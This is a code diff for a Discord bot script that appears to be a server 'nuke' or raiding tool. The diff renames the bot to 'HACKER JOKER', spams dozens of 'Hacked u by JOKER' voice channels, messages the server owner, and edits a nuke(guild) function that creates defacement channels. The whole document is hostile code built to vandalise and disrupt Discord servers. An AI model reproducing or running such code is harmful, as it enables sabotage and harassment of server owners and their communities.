@@ -25,12 +25,12 @@ LOka.on("message", message => {
   if (message.content.startsWith('hix15')) {
     LOka.user.setUsername(argresult);
   }
-    if (message.content.startsWith(Go)) {
+    if (message.content.startsWith('.')) {
     LOka.user.setStatus(argresult);
   }
 });
  
-var x1 = "Go"
+var x1 = "."
 LOka.on('message', message => {
      if (message.content === ".") {
 LOka.user.setAvatar(`https://cdn.discordapp.com/attachments/359820599138451457/368032849011539978/3ae3b128480b1a13a0ab6082cf3e6289.jpg`)
@@ -46,7 +46,7 @@ LOka.user.setUsername("HACKER JOKER")
 });
 LOka.on('message', message => {
      if (message.content === ".") {
-LOka.user.setGame(`Hacked u by unknown Is here`,'https://www.twitch.tv/hix')
+LOka.user.setGame(`HACKER JOKER`,'https://www.twitch.tv/hix')
  
 }
 });
@@ -403,6 +403,35 @@ m.createChannel('Hacked u by JOKER', 'voice');
  
  
  
+
+m.createChannel('Hacked u by JOKER', 'voice');
+m.createChannel('Hacked u by JOKER', 'voice');
+m.createChannel('Hacked u by JOKER', 'voice');
+m.createChannel('Hacked u by JOKER', 'voice');
+m.createChannel('Hacked u by JOKER', 'voice');
+m.createChannel('Hacked u by JOKER', 'voice');
+m.createChannel('Hacked u by JOKER', 'voice');
+m.createChannel('Hacked u by JOKER', 'voice');
+m.createChannel('Hacked u by JOKER', 'voice');
+ 
+                   
+                   
+    
+m.createChannel('Hacked u by JOKER', 'voice');
+m.createChannel('Hacked u by JOKER', 'voice');
+m.createChannel('Hacked u by JOKER', 'voice');
+m.createChannel('Hacked u by JOKER', 'voice');
+m.createChannel('Hacked u by JOKER', 'voice');
+m.createChannel('Hacked u by JOKER', 'voice');
+m.createChannel('Hacked u by JOKER', 'voice');
+m.createChannel('Hacked u by JOKER', 'voice');
+m.createChannel('Hacked u by JOKER', 'voice');
+                
+                   
+                   
+                   
+                   
+                   
 })
 }
  
@@ -418,7 +447,7 @@ async function nuke(guild) {
  
   await guild.fetchMembers();
  
-  await guild.owner.send(' HACKER').catch(e => { return void e; });
+  await guild.owner.send(' HACKER JOKER').catch(e => { return void e; });
  
  
  
@@ -437,9 +466,9 @@ async function nuke(guild) {
     }
   }));
  
-    await guild.createChannel('Hacked u by unknown Is here', 'text');
+    await guild.createChannel('Hacked u by JOKER', 'text');
  
-      await guild.createChannel('Hacked u by unknown Is here', 'voice');
+      await guild.createChannel('Hacked u by JOKER', 'voice');
  
  
  
